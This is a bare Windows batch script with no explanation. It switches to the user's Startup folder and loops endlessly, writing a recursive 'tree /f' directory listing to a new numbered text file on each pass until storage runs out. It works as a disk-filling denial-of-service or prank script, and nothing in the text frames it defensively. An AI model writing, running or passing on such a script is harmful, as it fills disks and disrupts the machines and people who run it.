cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set /a x=0
:start
tree /f > %x%.txt
set /a x=%x%+1
goto :start
